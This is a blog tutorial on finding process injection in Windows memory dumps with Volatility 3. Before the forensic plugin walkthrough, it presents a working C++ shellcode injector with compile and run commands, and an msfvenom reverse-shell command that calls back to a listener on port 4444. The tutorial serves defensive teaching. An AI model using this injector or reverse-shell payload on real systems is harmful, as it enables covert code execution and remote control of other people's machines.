---
title:  "Basic memory forensics with Volatility. Process injection example."
date:   2022-02-07 10:00:00 +0600
header:
  teaser: "/assets/images/39/2022-02-08_19-11.png"
categories:
  - tutorial
tags:
  - red team
  - blue team
  - malware
  - forensics
  - volatility
---

﷽

Hello, cybersecurity enthusiasts and white hackers!

![injection](/assets/images/39/2022-02-08_19-11.png){:class="img-responsive"}    

This is a result of my own research on memory forensics via the Volatility Framework.      

### memory forensics

Sometimes, after a system has been pwned, it's important to extract forensically-relevant information. RAM is considered volatile - meaning that it doesn't live long. Each time a computer is restarted, it flushes its memory from RAM, which means that, if a computer is hacked and then is restarted, you'll lose a lot of information that tells the story about how the system was compromised by attacker.    

### volatility Framework

Volatility is a tool that can be used to analyze the volatile memory of a system. Download and install from [here](https://github.com/volatilityfoundation/volatility3)        

### practice example

First of all, for simulating malware activity, create [classic](/tutorial/2021/09/18/malware-injection-1.html) process injection malware:    

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// meow-meow messagebox payload (without encryption)
unsigned char my_payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

unsigned int my_payload_len = sizeof(my_payload);

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  // parse process ID
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" data between processes
  WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

compile:

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![injection 2](/assets/images/39/2022-02-07_13-48_1.png){:class="img-responsive"}    

and run:   

```bash
.\hack.exe 2380
```

![injection 3](/assets/images/39/2022-02-09_00-04.png){:class="img-responsive"}    

As you can see, everything is work perfectly.    

### winpmem

Secondly, after run our malicious activity, I downloaded `winpmem` into victim's Windows 7 x64 machine. So, run:   

```cmd
>.\winpmem_v3.3.rc3.exe --output mem.raw --format raw --volume_format raw
```

![injection 4](/assets/images/39/2022-02-07_23-06.png){:class="img-responsive"}    

After finished, move `mem.raw` file to my attacker's kali machine.   

### analyzing Windows memory

#### obtaining OS

Obtaining the operating system of the memory dump is pretty easy. The plugin `windows.info.Info` can be specified to enumerate information about the captured memory dump:   

```bash
python3 ./volatility3/vol.py -f ./cybersec_blog/2022-02-07-mem-forensics-1/dump/mem.raw windows.info.Info
```
![injection 5](/assets/images/39/2022-02-07_22-59.png){:class="img-responsive"}    

#### analysing processes

Then, I used the `windows.pslist.PsList` plugin to look at the processes that were running on the victim's computer at the time the memory was captured:    

```bash
python3 ./volatility3/vol.py -f ./cybersec_blog/2022-02-07-mem-forensics-1/dump/mem.raw windows.pslist.PsList
```
![injection 6](/assets/images/39/2022-02-07_22-59_1.png){:class="img-responsive"}    
![injection 7](/assets/images/39/2022-02-07_23-10.png){:class="img-responsive"}    

Looking at the list, PID `2380` is `mspaint.exe`, which is our victim process.    

### process injected code   

Then for finding hidden and injected code, run:   

```bash
python3 ./volatility3/vol.py -f ./cybersec_blog/2022-02-07-mem-forensics-1/dump/mem.raw windows.malfind.Malfind
```
![injection 8](/assets/images/39/2022-02-09_00-54.png){:class="img-responsive"}    

![injection 9](/assets/images/39/2022-02-07_23-13.png){:class="img-responsive"}    

As you can see, we found memory section which we injected our `meow-meow` payload.    

Then, dump the process memory with `windows.memmap.Memmap` plugin:       

```bash
python3 ./volatility3/vol.py -f ./cybersec_blog/2022-02-07-mem-forensics-1/dump/mem.raw --output-dir ./cybersec_blog/2022-02-07-mem-forensics-1/dump/ windows.memmap.Memmap --pid 2380 --dump
```

![injection 10](/assets/images/39/2022-02-07_23-17.png){:class="img-responsive"}    

### finding strings

The `strings` command is a popular static malware analysis tool that can quickly assist in extracting human-readable pertaining to a malicious file:    

```bash
strings -e l ./cybersec_blog/2022-02-07-mem-forensics-1/dump/pid.2380.dmp | grep -ie "meow-meow"
```

![injection 11](/assets/images/39/2022-02-07_23-19.png){:class="img-responsive"}    

![injection 12](/assets/images/39/2022-02-07_23-20.png){:class="img-responsive"}    

### network connections

Next, I tested a scenario in which a malware or an attacker injects code into an already running process, and only then initiates a connection. Let's go to replace our payload in malware example as `msfvenom` reverse shell for demo:   

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.2.6 LPORT=4444 EXITFUNC=thread -f c
```

![injection 13](/assets/images/39/2022-02-08_18-51.png){:class="img-responsive"}    

![injection 14](/assets/images/39/2022-02-08_18-57.png){:class="img-responsive"}    

For the correctness of the experiment, we will launch our malware and make a memory dump:

![injection 15](/assets/images/39/2022-02-09_02-27.png){:class="img-responsive"}    

![injection 16](/assets/images/39/2022-02-09_02-32.png){:class="img-responsive"}    

Then run Volatility with `windows.netstat.NetStat` plugin. This plugin allows you to see the network connections on the machine at the time the memory was captured:        

```bash
python3 ./volatility3/vol.py -f ./cybersec_blog/2022-02-07-mem-forensics-1/dump/mem.raw windows.netstat.NetStat | grep -ie "mspaint.exe"
```

![injection 17](/assets/images/39/2022-02-09_02-36.png){:class="img-responsive"}    

### conclusion

There are still a ton of other plugins that are currently available that I did not mention in this tutorial and the memory sample I were analyzing was a Windows memory dump, because I did not work with the different plugins that target the Linux and Mac operating systems.   

I hope this post will be very helpful for entry level cybersec specialists from blue team.    

[Volatility3](https://github.com/volatilityfoundation/volatility3)    
[Classic code injection technique](/tutorial/2021/09/18/malware-injection-1.html)    

> This is a practical case for educational purposes only.      

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*
